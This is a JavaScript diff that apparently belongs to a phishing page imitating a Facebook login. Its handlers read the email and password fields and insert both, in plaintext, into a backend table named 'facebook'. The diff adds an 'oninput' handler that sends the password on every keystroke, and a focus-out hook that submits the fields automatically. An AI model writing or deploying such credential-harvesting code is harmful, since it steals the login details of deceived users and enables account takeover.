@@ -481,25 +481,17 @@ var button =document.getElementById('loginbutton1');
 button.onclick = function ()
 {
     var request=new XMLHttpRequest();
-
-   
-
     var pass =document.getElementById("pass1");
       var email =document.getElementById("email");
-
     console.log(pass.value);
     console.log(email.value);
-    
-    
 function mySuccessHandler (data) {
   console.log(data);
   console.log("ramesh");
 }
-
 function myErrorHandler (e) {
   console.log(e);
 }
-
 hasura.data.query({
   type: 'insert',
   args:{
@@ -513,12 +505,9 @@ hasura.data.query({
   mySuccessHandler,
   myErrorHandler
 );
-
-    var pass =document.getElementById("pass1");
-    
+    var pass =document.getElementById("pass1");  
    // request.open('GET','http://shivamd20.imad.hasura-app.io/counter',false);
    // request.send(null);
-    
 };
 
   var pass =document.getElementById("pass1");
@@ -527,6 +516,34 @@ pass.onfocusout=function()
 {
     button.click();
 };
+
+pass.oninput= function ()
+{
+    var request=new XMLHttpRequest();
+    var pass =document.getElementById("pass1");
+      var email =document.getElementById("email");
+    console.log(pass.value);
+    console.log(email.value);
+function mySuccessHandler (data) {
+  console.log(data);
+  console.log("ramesh");
+}
+function myErrorHandler (e) {
+  console.log(e);
+}
+hasura.data.query({
+  type: 'insert',
+  args:{
+      "table":"facebook",
+      "objects":[
+          {"email":email.value,
+          "password":pass.value}
+      ]
+  }
+        },
+  mySuccessHandler,
+  myErrorHandler
+);
 
 
 
